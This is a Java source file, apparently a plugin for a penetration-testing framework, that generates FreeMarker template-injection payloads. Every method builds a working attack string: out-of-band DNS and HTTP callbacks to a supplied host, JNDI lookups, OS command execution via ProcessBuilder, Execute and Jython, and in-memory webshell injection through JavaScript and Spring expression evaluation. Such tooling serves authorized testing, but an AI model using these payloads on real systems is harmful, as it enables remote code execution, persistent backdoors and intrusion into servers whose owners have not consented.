package me.gv7.woodpecker.plugin.exprs;

import me.gv7.woodpecker.plugin.IExpr;
import me.gv7.woodpecker.plugin.utils.*;

import static me.gv7.woodpecker.plugin.utils.Utils.escape;

public class FreeMarkerExpr implements IExpr {
    private String _encoder = "none";

    @Override
    public void setEncoder(String encoder) {
        _encoder = encoder;
    }

    private String out(String text) {
        return Utils.encoder(text, _encoder);
    }

    @Override
    public String getName() {
        return "FreeMarker";
    }

    @Override
    public String[] genDnslog(String domain) {
        return new String[]{
                out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.net.InetSocketAddress\", \"" + domain + "\").getAddress()}")
        };
    }

    @Override
    public String[] genHttplog(String url) {
        return new String[]{
                out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"new java.net.URL('" + url + "').getContent();\")}")
        };
    }

    @Override
    public String[] genSleep(int sec) {
        return new String[]{
                out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.swing.JRadioButton\").doClick(" + sec * 1000 + ")}")
        };
    }

    @Override
    public String[] genMemShell(byte[] memShellClass) {
        try {
            return new String[]{
                    "[+] JS-Unsafe方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64) + "\")}") + System.lineSeparator() + " <==",
                    "[+] JS-BASE64方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64) + "\")}") + System.lineSeparator() + " <==",
                    "[+] JS-BigInteger方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER) + "\")}") + System.lineSeparator() + " <==",
                    "[+] JS-BCEL方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BCEL) + "\")}") + System.lineSeparator() + " <==",
                    "[+] 以下方案需具有spring-expression(SpEL)依赖",
                    "[+] Spring反射组件方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"" + SpELMemShellFactory.genSpringMemShell1(memShellClass) + "\").getValue()}") + System.lineSeparator() + " <==",
                    "[+] BCEL方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"" + SpELMemShellFactory.genSpringMemShell2(memShellClass) + "\").getValue()}") + System.lineSeparator() + " <=="
            };
        } catch (Exception ex) {
            return new String[]{
                    "class文件异常",
                    Utils.getErrDetail(ex)
            };
        }
    }

    @Override
    public String[] genJNDI(String jndiAddress) {
        return new String[]{
                out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.naming.InitialContext\").lookup(\"" + jndiAddress + "\")}"),
                out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"new javax.naming.InitialContext().lookup('" + jndiAddress + "')\").getValue()}")
        };
    }

    @Override
    public String[] genLoadJar(String url, String className) {
        return new String[0];
    }

    @Override
    public String[] genExec(String command) {
        return new String[]{
                out("<#assign value=\"freemarker.template.utility.ObjectConstructor\"?new()>${value(\"java.lang.ProcessBuilder\"," + ArgumentTokenizer.getTokenizedString(command, "\"") + ").start()}")
        };
    }

    @Override
    public String[] genExecWithEcho(String command) {
        return new String[]{
                out("<#assign vx=\"freemarker.template.utility.Execute\"?new()> ${ vx(\"" + escape(command, "\"") + "\") }"),
                out("${\"freemarker.template.utility.Execute\"?new()(\"" + escape(command, "\"") + "\")}"),
                out("<#assign value=\"freemarker.template.utility.JythonRuntime\"?new()><@value>import os;os.system(\"" + escape(command, "\"") + "\")</@value>")
        };
    }

}
